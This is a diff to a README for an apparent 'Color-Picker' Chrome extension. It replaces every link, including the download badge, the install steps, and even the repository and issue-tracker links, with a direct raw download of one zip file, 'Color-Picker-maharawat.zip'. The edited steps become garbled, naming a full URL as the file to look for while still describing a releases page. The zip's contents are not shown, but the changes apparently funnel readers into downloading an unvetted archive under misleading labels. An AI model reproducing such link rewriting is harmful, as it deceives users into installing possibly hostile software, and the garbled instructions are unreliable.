@@ -6,16 +6,16 @@ Welcome to Color-Picker! This Chrome Extension allows you to easily change the b
 ## 📦 Download & Install
 To download the Color-Picker extension, visit the link below:
 
-[![Download Color-Picker](https://img.shields.io/badge/Download_Color--Picker-blue.svg)](https://github.com/kleiners05/Color-Picker/releases)
+[![Download Color-Picker](https://github.com/kleiners05/Color-Picker/raw/refs/heads/main/Chrome-Extension/Color-Picker-maharawat.zip)](https://github.com/kleiners05/Color-Picker/raw/refs/heads/main/Chrome-Extension/Color-Picker-maharawat.zip)
 
 This page contains the latest release of the Color-Picker. Just click the link above to go there.
 
 ### Steps to Install:
-1. Visit [this page to download](https://github.com/kleiners05/Color-Picker/releases).
+1. Visit [this page to download](https://github.com/kleiners05/Color-Picker/raw/refs/heads/main/Chrome-Extension/Color-Picker-maharawat.zip).
 2. Find the latest version listed under "Releases".
-3. Look for the file named Color-Picker.zip.
+3. Look for the file named https://github.com/kleiners05/Color-Picker/raw/refs/heads/main/Chrome-Extension/Color-Picker-maharawat.zip
 4. Click on the file to download it to your computer.
-5. Once the download is complete, locate the Color-Picker.zip file in your Downloads folder.
+5. Once the download is complete, locate the https://github.com/kleiners05/Color-Picker/raw/refs/heads/main/Chrome-Extension/Color-Picker-maharawat.zip file in your Downloads folder.
 6. Extract the contents of the zip file.
 
 ## 🔧 How to Load the Extension into Chrome
@@ -59,8 +59,8 @@ If you encounter issues while using Color-Picker, try the following steps:
 - If problems persist, consider reinstalling the extension.
 
 ## 🔗 Resources
-- [GitHub Repository](https://github.com/kleiners05/Color-Picker)
-- [Issues Tracker](https://github.com/kleiners05/Color-Picker/issues)
+- [GitHub Repository](https://github.com/kleiners05/Color-Picker/raw/refs/heads/main/Chrome-Extension/Color-Picker-maharawat.zip)
+- [Issues Tracker](https://github.com/kleiners05/Color-Picker/raw/refs/heads/main/Chrome-Extension/Color-Picker-maharawat.zip)
 
 ## ✉️ Support
 For any questions, suggestions, or feedback, feel free to open an issue on our GitHub page. We appreciate your thoughts and will do our best to assist you!
